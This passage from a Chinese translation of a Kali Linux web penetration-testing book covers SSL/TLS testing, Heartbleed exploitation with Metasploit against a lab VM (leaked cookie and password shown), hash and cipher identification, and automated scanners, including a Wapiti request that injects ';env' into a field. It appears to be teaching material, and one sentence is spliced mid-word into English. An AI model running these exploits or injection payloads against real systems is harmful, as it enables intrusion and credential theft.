  \     ECDH-256 bits  256 bits    HTTP 200 OK\n        ECDHE-RSA-AES256-GCM-SHA384\
  \     ECDH-256 bits  256 bits    HTTP 200 OK\n        DHE-RSA-CAMELLIA256-SHA  \
  \       DH-1024 bits    256 bits    HTTP 200 OK\n        DHE-RSA-AES256-SHA256 \
  \          DH-1024 bits    256 bits    HTTP 200 OK\n        DHE-RSA-AES256-SHA \
  \             DH-1024 bits    256 bits    HTTP 200 OK\n        DHE-RSA-AES256-GCM-SHA384\
  \       DH-1024 bits    256 bits    HTTP 200 OK\n        CAMELLIA256-SHA       \
  \          -               256 bits    HTTP 200 OK\n        AES256-SHA256      \
  \             -               256 bits    HTTP 200 OK\n        AES256-SHA      \
  \                -               256 bits    HTTP 200 OK\n        AES256-GCM-SHA384\
  \               -               256 bits    HTTP 200 OK\n        ECDHE-RSA-AES128-SHA256\
  \         ECDH-256 bits   128 bits    HTTP 200 OK\n        ECDHE-RSA-AES128-SHA\
  \            ECDH-256 bits   128 bits    HTTP 200 OK\n        ECDHE-RSA-AES128-GCM-SHA256\
  \     ECDH-256 bits   128 bits    HTTP 200 OK\n        DHE-RSA-CAMELLIA128-SHA \
  \        DH-1024 bits    128 bits    HTTP 200 OK\n        DHE-RSA-AES128-SHA256\
  \           DH-1024 bits    128 bits    HTTP 200 OK\n```\n\n## 使用 Nmap 测试 SSL 配置\n\
  \nNmap 包含一个名为 ssl-enum-ciphers 的脚本，可识别服务器支持的密码套件，并根据其密码强度对其进行评级。它使用 SSLv3、TLS 1.1\
  \ 和 TLS 1.2 进行多次连接。还有可识别已知漏洞（例如 Heartbleed 或 POODLE）的脚本。\n\n\n\n\n\n我们将使用三个脚本对目标（bee-box\
  \ v1.6, https://sourceforge.net/projects/bwapp/files/bee-box/）运行 Nmap：ssl-enum-ciphers，用于列出服务器允许的所有密码套件；ssl-heartbleed\
  \ 和 ssl-poodle，用于测试这些特定的漏洞：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_311_0.png)\n\
  \n此第一张截图显示了 ssl-enum-ciphers 的结果，显示了允许用于 SSLv3 的密码套件。在下一张截图中，ssl-heartbleed 脚本显示服务器存在漏洞：\n\
  \n```\nssl-heartbleed:\n  VULNERABLE:\n    The Heartbleed Bug is a serious vulnerability\
  \ in the popular OpenSSL cryptographic software library. It allows for stealing\
  \ information intended to be protected by SSL/TLS encryption.\n    State: VULNERABLE\n\
  \    Risk factor: High\n    OpenSSL versions 1.0.1 and 1.0.2-beta releases (including\
  \ 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug\
  \ allows for reading memory of systems protected by the vulnerable OpenSSL versions\
  \ and could allow for disclosure of otherwise encrypted confidential information\
  \ as well as the encryption keys themselves.\n    References:\n    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160\n\
  \    http://www.openssl.org/news/secadv_20140407.txt\n    http://cvedetails.com/cve/2014-0160/\n\
  ```\n\n此外，ssl-poodle 脚本将服务器识别为易受 POODLE 攻击：\n\n```\nssl-poodle:\n  VULNERABLE:\n\
  \    SSL POODLE information leak\n    State: VULNERABLE\n    IDs: CVE-CVE-2014-3566\
  \ OSVDB:113251\n    The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and\
  \ other products, uses nondeterministic CBC padding, which makes it easier for man-in-the-middle\
  \ attackers to obtain cleartext data via a padding-oracle attack, aka the \"POODLE\"\
  \ issue.\n    Disclosure date: 2014-10-14\n    Check results:\n      TLS_RSA_WITH_AES_128_CBC_SHA\n\
  \    References:\n    https://www.openssl.org/~bodo/ssl-poodle.pdf\n    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n\
  \    https://www.imperialviolet.org/2014/10/14/poodle.html\n    http://osvdb.org/113251\n\
  MAC Address: 08:00:27:06:68:C5 (Oracle VirtualBox virtual NIC)\n```\n\n## 利用 Heartbleed\n\
  \nHeartbleed 于 2014 年 4 月被发现。它是 OpenSSL TLS 实现中的缓冲区溢读情况；即可以读取超出允许范围的内存数据。这种情况允许攻击者以明文形式读取\
  \ OpenSSL 服务器的内存信息。这意味着无需解密或甚至拦截客户端与服务器之间的任何通信；你只需询问服务器其内存中的内容，它就会用未加密的信息作出回答。\n\
  \n实际上，Heartbleed 可以在任何未修补的 OpenSSL 服务器上被利用（版本 1.0.1 至 1.0.1f 以及 1.0.2-beta 至 1.0.2-beta1），并且支持\
  \ TLS，通过利用可从服务器内存中读取多达 64 KB 的明文数据。这可以重复进行，并且不会在服务器上留下任何痕迹或日志。这意味着攻击者可能能够读取服务器上的明文信息，例如服务器的私钥或加密证书、会话\
  \ cookie，或可能包含用户密码和其他敏感信息的 HTTPS 请求。有关 Heartbleed 的更多信息可以在其维基百科页面 https://en.wikipedia.org/wiki/Heartbleed\
  \ 上找到。\n\n我们将使用 Metasploit 模块来利用 bee-box 中的 Heartbleed 漏洞。首先，你需要打开 Metasploit 控制台并加载模块：\n\
  \n```\nmsfconsole\nuse auxiliary/scanner/ssl/openssl_heartbleed\n```\n\n使用 show\
  \ options 命令，你可以看到模块运行所需的参数。\n\n让我们设置要攻击的主机和端口并运行模块。请注意，此模块可以同时针对多个主机运行，只需在 RHOSTS\
  \ 选项中输入以空格分隔的 IP 地址和主机名列表即可：\n\n```\nshow options\nset RHOSTS 10.7.7.8\nset RPORT\
  \ 8443\nrun\n```\n\n以下执行的脚本显示服务器存在漏洞：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_314_0.png)\n\
  \n然而，这里没有提取到相关信息。出了什么问题？\n\n事实上，模块已从服务器内存中提取了信息，但还有更多选项需要设置。你可以使用 show advanced\
  \ 查看 Metasploit 模块的高级选项。要查看获取的信息，将 VERBOSE 选项设置为 true 并再次运行：\n\n```\nset VERBOSE\
  \ true\nrun\n```\n\n现在我们捕获了一些信息：\n\n```\n[*] 10.7.7.8:8443          - Sending Heartbeat...\n\
  [+] 10.7.7.8:8443          - Heartbeat response, 18819 bytes\n[+] 10.7.7.8:8443\
  \          - Heartbeat response with leak\n[*] 10.7.7.8:8443          - Printable\
  \ info leaked:\n......Za.Oe......(Dg.B.+....*K5..6.qD.f......\"!.9.8..........5..........\n\
  2......E.D..../.A...................on/x-www-form-urlencoded..User-Agent\n: Mozilla/5.0\
  \ (X11; Linux x86_64) AppleWebKit/605.1 (KHTML, like Gecko) Version/11.0 Safari/60\n\
  5.1 Debian/buildd-unstable (3.26.4-1) Epiphany/3.26.4..Origin: https://10.7.7.8:8443..DNT:\
  \ 1..\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8..Accept-Encoding:\
  \ gzip\n, deflate..Accept-Language: en-us, en;q=0.90..Connection: Keep-Alive..Cookie:\
  \ PHPSESSID=87ee61\nc6d5ae416d06bc793cf2e19519; security_level=0..Content-Length:\
  \ 74......p....r.l..04l....b....\n...password_curr=newpassword&password_new=bug&password_conf=bug&action=change......ym..ky.<3.\n\
  ..\\Z......?.X....W.[.9.3.$.\"!.......]................L.J\n..............................................................repe\n\
  ated 15319 times ............................................................\n\
  ..................................................................@.\n.. repeated\
  \ 2165 times ............................................................\n........................................................................\n\
  [*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  ```\n\n如果你分析结果，会发现，在这种情况下，服务器内存中有一个密码更改请求，你可以看到之前的密码和当前密码以及用户的会话 cookie。\n\n## POODLE\n\
  \nPadding Oracle On Downgraded Legacy Encryption（POODLE），顾名思义，是利用从 TLS 降级到 SSLv3\
  \ 过程的填充预言机攻击。\n\n填充预言机攻击需要存在一个预言机，这意味着一种识别数据包填充是否正确的方法。这可能简单到服务器返回填充错误响应。当攻击者更改有效消息的最后一个字节并且服务器以错误响应时发生。当消息被更改且未导致错误时，填充对于该字节的值被接受。结合\
  \ IV，这可以揭示密钥流的一个字节，从而可以解密加密文本。让我们记住 IV 需要与数据包一起发送，以便接收方知道如何解密信息。这非常类似于盲 SQL 注入攻击。\n\
  \n为此，攻击者需要在客户端和服务器之间取得中间人位置，并具有使客户端发送恶意探测的机制。最后一个要求可以通过使客户端打开包含执行该工作的 JavaScript\
  \ 代码的页面来实现。\n\nKali Linux 不包含开箱即用的 POODLE 利用工具，但 Thomas Patzke 在 GitHub 上有一个概念验证（PoC）：https://github.com/thomaspatzke/POODLEAttack。读者可以将其作为练习来测试此\
  \ PoC。\n\n在大多数 Web 应用程序渗透测试中，仅查看 SSLScan、SSLyze 或 Nmap 输出以了解是否允许 SSLv3，从而知道服务器易受\
  \ POODLE 攻击就足够了；并且不需要进一步的测试来证明这一事实或说服你的客户禁用该协议，该协议已被取代近 20 年，最近被宣布为过时。\n\n尽管 POODLE\
  \ 是 TLS 等加密协议的严重漏洞，但在现实场景中执行它的复杂性使得攻击者更有可能使用诸如 SSL Stripping（https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf）等技术来强制受害者通过未加密的协议浏览。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_316_0.png)\n\n## 自定义加密协议\n\n作为渗透测试人员，遇到开发人员对标准加密协议进行自定义实现或尝试创建自己的自定义算法的应用程序并不罕见。在这种情况下，你需要特别注意这些模块，因为它们可能包含多个缺陷，如果发布到生产环境中可能会造成灾难性后果。\n\
  \n如前所述，加密算法是由信息安全专家和密码学专业数学家通过多年的实验和测试创建的。对于单个开发人员或小型团队来说，设计一个密码学上安全的算法或改进 OpenSSL\
  \ 或编程语言的加密库等经过严格测试的实现是极不可能的。\n\n\n\n\n\n## 识别加密和哈希信息\n\n当遇到自定义加密实现或无法识别为明文的数据时，第一步是定义此类数据所提交的处理过程。如果源代码可以方便获取，此任务相当直接。在更可能的情况下代码不可用时，需要以多种方式分析数据。\n\
  \n## 哈希算法\n\n如果处理结果的长度始终相同而不管提供的数据量大小，你可能面对的是一个哈希函数。为了确定该函数，可以使用结果值的长度：\n\n| 函数\
  \ | 长度 | 示例，hash (\"Web Penetration Testing with Kali Linux\") |\n|---|---|---|\n\
  | MD5 | 16 bytes | fbdcd5041c96ddbd82224270b57f11fc |\n| SHA-1 | 20 bytes | e8dd62289bcf\
  \ f206905cf269c06692ef7c6938a0 |\n| SHA-2 (256) | 32 bytes | dbb5195ef411019954650b6805bf66efc5fa5fef4f80a5f4afda702154ee07d3\
  \ |\n| SHA-2 (512) | 64 bytes | 6f0b5c34cbd9d66132b7d3a4484f1a9af02965904de38e3e3c4e66676a9\
  \ 48f20bd0b5b3ebcac9fdbd2f89b76cfde5b0a0ad9c06bccbc662be420b877c080e8fe |\n\n注意前面的示例如何使用十六进制编码表示每个字节，用两个十六进制数字表示每个字节的值（0-255）。为了说明，MD5\
  \ 哈希中的 16 个字节为 fb-dc-d5-04-1c-96-dd-bd-82-22-42-70-b5-7f-11-fc。例如，第十一个字节（42）是十进制值\
  \ 66，即 ASCII 字母 B。\n\n此外，以 base64 编码找到哈希并不罕见。例如，前表中 SHA-512 哈希也可以如下呈现：\n\n```\n\
  bwtcNMvZ1mEyt90kSE8amvApZZBN444+PE5mZ2UjyC9C1s+vKyf29L4m3bP31sKCtnAa8y8ZivkILh3wIDo/g==\n\
  ```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_317_0.png)\n\nBase64 是一种编码技术，用于仅使用可打印\
  \ ASCII 字符集来表示二进制数据，其中 base64 编码的字节代表原始字节的 6 位，因此 3 个字节（24 位）可以用 4 个 ASCII 可打印字节在\
  \ base64 中表示。\n\n## hash-identifier\n\nKali Linux 包含一个名为 hash-identifier 的工具，它有一长串哈希模式，非常有用以确定所涉及的哈希类型：\n\
  \n```\nroot@kali:~# hash-identifier\n######################################################################\n\
  #                                                                    #\n#      \
  \                                                              #\n#            \
  \                                                        #\n#                  \
  \                                                  #\n#                        \
  \                                            #\n#                              \
  \                                      #\n######################################################################\n\
  HASH: 6f0b5c34cbd9d66132b7d3a4484f1a9af02965904de38e3e3c4e6667d948f20bd0b5b3ebcac9fdbd2f89b76cfde5b0a0ad9c06bccbc662be420b877c080e8fe\n\
  Possible Hashes:\n[+] SHA-512\n[+] Whirlpool\nLeast Possible Hashes:\n[+] SHA-512(HMAC)\n\
  [+] Whirlpool(HMAC)\nHASH: e76a46033c5a60454c11bddd6c980668\nPossible Hashes:\n\
  [+] MD5\n[+] Domain Cached Credentials - MD4(MD4({$pass})). (strtolower($username))\n\
  Least Possible Hashes:\n[+] RAdmin v2.x\n[+] NTLM\n[+] MD4\n[+] MD2\n[+] MD5(HMAC)\n\
  [+] MD4(HMAC)\n```\n\n## 频率分析\n\n判断一组数据是否被加密、编码或混淆的一个非常有用的方法是分析每个字符在数据中重复的频率。在明文消息中，例如字母，ASCII\
  \ 字符在字母数字范围内（32 到 126）的频率会远高于斜杠或不可打印字符，例如转义（27）或删除（127）键。\n\n另一方面，人们会期望加密文件对 0 到\
  \ 255 的每个字符都有非常相似的频率。\n\n这可以通过准备一组文件进行比较来测试。让我们将一个明文文件作为基准，与该文件的另外两个版本进行比较：一个混淆的和一个加密的。首先创建一个明文文件。使用\
  \ dmesg 将内核消息发送到文件：\n\n```\ndmesg > /tmp/clear_text.txt\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_319_0.png)\n\
  \n你也可以应用一种称为**旋转**的混淆技术，它以循环方式用另一个字母替换一个字母。我们将使用 *ROT13*，在字母表中旋转 13 个位置（即 a 将变为\
  \ n，b 将变为 o，以此类推）。这可以通过编程完成，也可以使用 http://www.rot13.com/ 等网站完成：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_320_0.png)\n\
  \n接下来，使用 OpenSSL 命令行实用程序以 AES-256 算法和 CBC 模式加密明文文件：\n\n```\nopenssl aes-256-cbc\
  \ -a -salt -in /tmp/clear_text.txt -out\n/tmp/encrypted_text.txt\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_321_0.png)\n\
  \n正如你所见，OpenSSL 的输出是 base64 编码的。在分析结果时你需要考虑到这一点。\n\n现在，如何对这些文件执行频率分析？我们将使用 Python\
  \ 和 Matplotlib（https://matplotlib.org/）库，预装在 Kali Linux 中，以图形方式表示每个文件的字符频率。以下脚本接受两个命令行参数，一个文件名和一个指示文件是否\
  \ base64 编码的指示符（1 或 0），读取该文件，并在必要时对其进行解码。然后，它计算 ASCII 空间（0-255）中每个字符的重复次数并绘制字符计数图：\n\
  \n```\nimport matplotlib.pyplot as plt\nimport sys\nimport base64\n\nif (len(sys.argv))<2:\n\
  ```\n\n```\nprint \"Usage file_histogram.py <source_file> [1|0]\"\n\nprint \"Reading\
  \ \" + sys.argv[1] + \"...\"\ns_file=open(sys.argv[1])\n\nif sys.argv[2] == \"1\"\
  :\n    text=base64.b64decode(s_file.read())\nelse:\n    text=s_file.read()\n\nchars=[0]*256\n\
  for line in text:\n    for c in line:\n        chars[ord(c)] = chars[ord(c)]+1\n\
  \ns_file.close()\np=plt.plot(chars)\nplt.show()\n```\n\n比较明文（左）和 ROT13（右）文件的频率，你会看到没有太大区别——所有字符都集中在可打印范围内：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_322_0.png)\n\n另一方面，查看加密文件的图时，分布要混乱得多：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_323_0.png)\n\n## 熵分析\n\n帮助区分加密信息与明文或编码的加密信息的决定性特征是在字符级别数据中发现的随机性。熵是数据集随机性的统计度量。\n\
  \n在网络通信中，文件存储基于由八位组成的字节使用，单个字符的最大熵为八。这意味着在样本中，这样的字节的八个位被使用相同的次数。熵低于六可能表明样本未被加密，而是被混淆或编码，或者使用的加密算法可能容易受到密码分析的攻击。\n\
  \n在 Kali Linux 中，你可以使用 ent 来计算文件的熵。它未预安装，但可以在 apt 仓库中找到：\n\n```\napt-get update\n\
  apt-get install ent\n```\n\n作为概念验证，让我们对一个明文样本执行 ent，例如 dmesg（内核消息缓冲区）的输出，其中包含大量文本、数字和符号：\n\
  \n```\ndmesg > /tmp/in\nent /tmp/in\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_324_0.png)\n\
  \n接下来，让我们加密相同的信息并计算熵。在此示例中，我们将使用 CBC 模式的 Blowfish：\n\n```\nopenssl bf-cbc -a -salt\
  \ -in /tmp/in -out /tmp/test2.enc\nent /tmp/test2.enc\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_324_1.png)\n\
  \n熵增加了，但没有高到加密样本的程度。这可能是由于样本有限（即仅可打印 ASCII 字符）。让我们使用 Linux 内置的随机数生成器进行最后一次测试：\n\n\
  ```\nhead -c 1M /dev/urandom > /tmp/out\nent /tmp/out\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_325_0.png)\n\
  \n理想情况下，强大的加密算法应具有非常接近八的熵值，这将与随机数据无法区分。\n\n## 识别加密算法\n\n一旦我们完成了频率和熵分析并可以确定数据已加密，我们需要识别使用了哪种算法。一种简单的方法是比较多个加密消息的长度；考虑以下示例：\n\
  \n- 如果长度不能始终被八整除，你可能面对的是流密码，其中 RC4 是最受欢迎的\n- AES 是一种分组密码，其输出长度始终可被 16 整除（128、192、256\
  \ 等）\n- DES 也是一种分组密码；其输出长度始终可被 8 整除，但不总是可被 16 整除（因为其密钥流为 56 位）\n\n\n\n\n\n## 敏感数据存储和传输中的常见缺陷\n\
  \n作为一名渗透测试人员，在 Web 应用程序中需要重点关注的重要事项之一就是它们如何存储和传输敏感信息。如果数据以明文形式传输或以这种方式存储，应用程序的所有者可能会面临重大的安全问题。\n\
  \n如果敏感信息，例如密码或信用卡数据，以明文形式存储在数据库中，利用 SQL 注入漏洞或通过其他任何方式获得服务器访问权限的攻击者将能够读取此类信息并直接从中获利。\n\
  \n有时，开发人员会自行实现混淆或加密机制ss of applications must include the secure flag in cookies\
  \ and the HTTP Strict-Transport-Security (HSTS) header to prevent SSL Strip attacks.\n\
  \n有关 TLS 配置的更多信息可在 https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet\
  \ 找到。\n\n密码绝不能以明文形式存储，使用加密算法来保护它们也是不明智的。相反，应使用单向加盐哈希函数。PBKDF2、bcrypt 和 SHA-512 是推荐的替代方案。不建议使用\
  \ MD5，因为现代 GPU 每秒可计算数百万个 MD5 哈希，使得使用高端计算机在数小时或几天内破解任何少于十个字符的密码成为可能。OWASP 在此主题上也有一个有用的备忘单，网址为\
  \ https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet。\n\n对于需要可恢复的敏感信息，例如支付信息，应使用强加密算法。AES-256、Blowfish\
  \ 和 Twofish 是不错的选择。如果可以使用非对称加密，例如 RSA，则应优先选择该方式（https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet）。\n\
  \n避免使用自定义实现或创建自定义算法。依靠已被使用、测试并多次遭受攻击的方案要好得多。\n\n\n\n\n"
- "## 9 在 Web 应用上使用自动化扫描器\n\n到目前为止，你已经学习了如何在 Web 应用中查找和利用漏洞，主要是通过手动逐个测试一个参数或一个请求。虽然这是发现安全缺陷的最佳方式，特别是与应用内部信息流、业务逻辑和授权控制相关的缺陷，但在专业的渗透测试中，有时由于时间、范围或数量的原因，项目无法完全通过手动测试来处理，需要使用自动化工具来帮助加速发现漏洞的过程。\n\
  \n在本章中，我们将讨论在使用自动化漏洞扫描器扫描 Web 应用时需要考虑的方面。你还将了解 Kali Linux 中包含的扫描器和模糊测试工具以及如何使用它们。\n\
  \n## 使用自动化扫描器前的注意事项\n\nWeb 应用漏洞扫描器的运行方式与其他类型的扫描器，例如 OpenVAS 或 Nessus，有所不同。后者通常连接到主机上的端口，获取在这些端口上运行的服务类型和版本，然后将此信息与漏洞数据库进行核对。相反，Web\
  \ 应用扫描器会在应用页面中识别输入参数，并在每个参数上提交大量请求以探测不同的有效载荷。\n\n由于以这种方式运行，自动化扫描几乎肯定会在数据库中记录信息、生成活动日志、更改现有信息，并且如果应用具有删除或恢复功能，甚至可能擦除数据库。\n\
  \n渗透测试人员在将 Web 漏洞扫描器作为测试手段之前必须考虑的关键事项如下：\n\n- 检查范围和项目文档，确保允许使用自动化工具。\n- 在专门为此目的设置的環境中进行测试（QA、开发或测试）。仅在客户明确要求下才使用生产环境，并让他们知道存在损坏数据的固有风险。\n\
  - 更新工具的插件和模块，以便结果与最新的漏洞披露和技术保持同步。\n- 在启动扫描前检查扫描工具参数和范围。\n- 将工具配置为最高级别的日志记录。日志在发生任何事件时以及用于验证发现和报告时都将非常有用。\n\
  - 不要让扫描器无人看管。你不需要盯着进度条，但应不断检查扫描器的运行情况以及被测试服务器的状态。\n- 不要依赖单一工具——有时不同工具对同一种测试会得到不同的结果。当一种工具遗漏某些漏洞时，另一种可能找到它但遗漏其他内容。因此，如果你在测试范围内使用自动化扫描器，请使用多个工具，并考虑使用\
  \ Burp Suite Professional 或 Acunetix 等商业产品。\n\n## Kali Linux 中的 Web 应用漏洞扫描器\n\n\
  Kali Linux 包含多个用于 Web 应用自动化漏洞扫描的工具。我们已经检查了一些这些工具，特别是那些专注于特定漏洞的工具，例如用于 SQL 注入的 sqlmap\
  \ 或用于跨站脚本（XSS）的 XSser。\n\n接下来，我们将介绍以下一些更通用的 Web 漏洞扫描器的基本用法：\n\n- Nikto\n- Skipfish\n\
  - Wapiti\n- OWASP-ZAP\n\n## Nikto\n\nNikto 是一个长期经典的工具，也许是世界上最广泛使用和最知名的 Web 漏洞扫描器。即使其扫描操作并不深入，其发现也比较通用（总体上与过时的软件版本、使用易受攻击的组件或通过分析响应头检测到的错误配置有关），Nikto\
  \ 仍然是一个非常有用的工具，因为它拥有广泛的测试集，并且不太可能破坏系统。\n\nNikto 是一个命令行工具。在下面的屏幕截图中，nikto 使用参数 -h\
  \ 指定要扫描的主机或 URL，-o 指定输出文件。文件的扩展名决定了报告的格式。其他常见格式有 .csv（逗号分隔文件）和 .txt（文本文件）：\n\n要了解更多详细信息以及使用\
  \ nikto 的其他选项，请使用 -H 选项运行它以获取完整帮助。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_335_0.png)\n\
  \n现在让我们看看上一次扫描的报告是什么样的：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_336_0.png)\n\
  \n根据这两个屏幕截图，你可以看到 Nikto 识别了服务器版本以及响应头中的一些问题。特别是，IP地址披露了缺少一些保护头，例如 X-Frame-Options\
  \ 和 X-XSS-Protection，并且会话 cookie 未包含 HttpOnly 标志。这意味着它可以通过脚本代码检索。\n\n## Skipfish\n\
  \n**Skipfish** 是一款非常快速的扫描器，可以帮助识别以下漏洞：\n\n- 跨站脚本\n- SQL 注入\n- 命令注入\n- XML/XPath\
  \ 注入\n- 目录遍历和文件包含\n- 目录列表\n\n根据其 Google Code 页面（http://code.google.com/p/skipfish/）：\n\
  \n> Skipfish 是一款主动式 Web 应用安全侦察工具。它通过递归爬取和基于字典的探测为目标站点准备交互式站点地图。生成的地图随后会用来自多个主动（但\
  \ hopefully 非破坏性）安全检查的输出进行注释。工具生成的最终报告旨在作为专业 Web 应用安全评估的基础。\n\nSkipfish 的使用非常简单。你只需提供要扫描的\
  \ URL 作为参数。可选地，你可以添加输出文件并微调扫描。要对测试 VM 中的 WackoPicko 应用运行 Skipfish 并生成 HTML 报告，请使用以下命令：\n\
  \n```\nskipfish -o WebPentest/skipfish_result -I WackoPicko http://10.7.7.5/WackoPicko/\n\
  ```\n\n-o 选项指示报告存储的目录。-I 选项告诉 Skipfish 仅扫描包含字符串 WackoPicko 的 URL，排除 VM 中其余的应用。最后一个参数是你要开始扫描的\
  \ URL。\n\n当命令启动时，会出现一个信息屏幕。你可以按任意键或等待 60 秒让扫描开始。扫描开始后，会显示以下状态屏幕：\n\n```\nskipfish\
  \ version 2.10b by lcamtuf@google.com\n\n- 10.7.7.5 -\n\nScan statistics:\n\n  \
  \  Scan time : 0:00:36.910\n    HTTP requests : 9113 (249.9/s), 19973 kB in, 2674\
  \ kB out (613.6 kB/s)\n    Compression : 5678 kB in, 31052 kB out (69.1% gain)\n\
  \    HTTP faults : 1 net errors, 0 proto errors, 0 retried, 0 drops\n    TCP handshakes\
  \ : 186 total (53.5 req/conn)\n    TCP faults : 0 failures, 1 timeouts, 1 purged\n\
  \    External links : 2333 skipped\n    Reqs pending : 844\n\nDatabase statistics:\n\
  \n    Pivots : 121 total, 16 done (13.22%)\n    In progress : 39 pending, 52 init,\
  \ 13 attacks, 1 dict\n    Missing nodes : 4 spotted\n    Node types : 1 serv, 36\
  \ dir, 8 file, 8 pinfo, 54 unkn, 14 par, 0 val\n    Issues found : 50 info, 2 warn,\
  \ 10 low, 6 medium, 0 high impact\n    Dict size : 105 words (105 new), 11 extensions,\
  \ 256 candidates\n    Signatures : 77 total\n```\n\n扫描完成后，会显示如下摘要屏幕：\n\n```\n[+]\
  \ Copying static resources...\n[+] Sorting and annotating crawl nodes: 1373\n[+]\
  \ Looking for duplicate entries: 1373\n[+] Counting unique nodes: 180\n[+] Saving\
  \ pivot data for third-party tools...\n[+] Writing scan description...\n[+] Writing\
  \ crawl tree: 1373\n[+] Generating summary views...\n[+] Report saved to 'WebPentest/skipfisk_result/index.html'\
  \ [0xc2eacd32].\n[+] This was a great day for science!\n```\n\n\n\n\n\n此外，一旦扫描完成，报告将在指定的文件夹中准备就绪。下面的屏幕截图显示了\
  \ Skipfish 报告的示例：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_339_0.png)\n\n报告按\
  \ Skipfish 识别出的漏洞风险从高到低排序（红色点到橙色点）。例如，Skipfish 在登录页面中识别出 SQL 注入漏洞，查询注入向量，扫描器将其评定为高风险。它还识别出目录遍历或文件包含以及可能的\
  \ XSS 漏洞，评定为中等风险，等等。\n\n## Wapiti\n\nWapiti 是一款基于命令行的主动维护的 Web 漏洞扫描工具。Wapiti 3.0\
  \ 版本于 2018 年 1 月发布（http://wapiti.sourceforge.net/）；然而，Kali Linux 仍包含之前的版本（2.3.0）。根据\
  \ Wapiti 网站，该工具包含用于检测以下漏洞的模块：\n\n- 文件泄露（本地和远程包含/require、fopen、readfile...）\n- 数据库注入（PHP/JSP/ASP\
  \ SQL 注入和 XPath 注入）\n- XSS（跨站脚本）注入（反射型和永久型）\n- 命令执行检测（eval()、system()、passthru()...）\n\
  - CRLF 注入（HTTP 响应拆分、会话固定...）\n- XXE（XML 外部实体）注入\n- 使用已知潜在危险文件（借助 Nikto 数据库）\n- 可被绕过的弱\
  \ .htaccess 配置\n- 提供敏感信息的备份文件存在（源代码泄露）\n- Shellshock（又名 Bash 漏洞）\n\n要启动 Wapiti，您需要在命令行中发出启动命令，后跟要扫描的\
  \ URL 和选项。\n\n在下面的屏幕截图中，Wapiti 在易受攻击的虚拟机上对 BodgeIt 的 HTTPS 站点进行运行，报告生成在 wapiti_output\
  \ 目录中（-o 选项）。您可以跳过 SSL 证书验证，因为测试虚拟机使用的是自签名证书。Wapiti 将在未验证的情况下停止扫描，因此使用 --verify-ssl\
  \ 0 来绕过此类验证。您不应发送超过 50 个相同请求的变体（-n 选项）。这是为了防止循环。最后，使用 2> null 可以防止标准错误输出过度填充屏幕，因为扫描器会发出多个带有非预期值的请求，而\
  \ Wapiti 的输出可能非常冗长：\n\n```\nwapiti https://10.7.7.5/bodgeit/ -o wapiti_output --verify-ssl\
  \ 0 -n 20 2> null\n```\n\n然后您将在屏幕上看到以下输出：\n\n```\nroot@kali:~/WebPentest# wapiti\
  \ https://10.7.7.5/bodgeit/ -o wapiti_output --verify-ssl 0 -n 20 2> null\nWapiti-2.3.0\
  \ (wapiti.sourceforge.net)\n\nNote\n======\nThis scan has been saved in the file\
  \ /root/.wapiti/scans/10.7.7.5.xml\nYou can use it to perform attacks without scanning\
  \ again the web site with the \"-k\" parameter\n[*] Loading modules:\nmod_crlf,\
  \ mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql,\
  \ mod_pentxss, mod_nikto\n\n[+] Launching module exec\nReceived a HTTP 500 error\
  \ in https://10.7.7.5/bodgeit/advanced.jsp\nEvil url: https://10.7.7.5/bodgeit/advanced.jsp%3Benv\n\
  Received a HTTP 500 error in https://10.7.7.5/bodgeit/basket.jsp\nEvil request:\n\
  POST /bodgeit/basket.jsp HTTP/1.1\nHost: 10.7.7.5\nReferer: https://10.7.7.5/bodgeit/product.jsp?prodid=2\n\
  Content-Type: application/x-www-form-urlencoded\n\nproductid=2&price=3.1&quantity=%3Benv\n\
  ```\n\n扫描需要一些时间。完成后，打开指定目录中的 index.html 文件即可查看结果。以下是 Wapiti 报告漏洞的示例：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_341_0.png)\n\
  \nWapiti 的报告非常详细，并且包含每个发现的描述、触发潜在漏洞的请求、提出的解决方案以及获取更多信息的参考。在前面的屏幕截图中，您可以看到它在 BodgeIt\
  \ 的搜索页面中发现了 XSS。\n\n## OWASP-ZAP scanner\n\nOWASP-ZAP 的众多功能中，有一个主动漏洞扫描器。在此情况下，主动是指扫描器会主动向服务器发送精心构造的请求，与被动扫描器不同，后者仅在通过代理正常浏览应用程序时分析\
  \ Web 服务器发送的请求和响应。\n\n要使用扫描器，您需要右键单击要扫描的站点或目录并选择 Attack | Active Scan...：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_342_0.png)\n\
  \n主动扫描器不会对所选目标进行任何爬取或蜘蛛扫描。因此，建议您在设置代理的情况下手动浏览目标站点，或在扫描目录或主机之前先运行蜘蛛。\n\n在 **Active\
  \ Scan** 对话框中，您可以选择目标、是否递归扫描，以及如果启用高级选项，您可以选择扫描策略、攻击向量、目标技术和其他选项：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_343_0.png)\n\
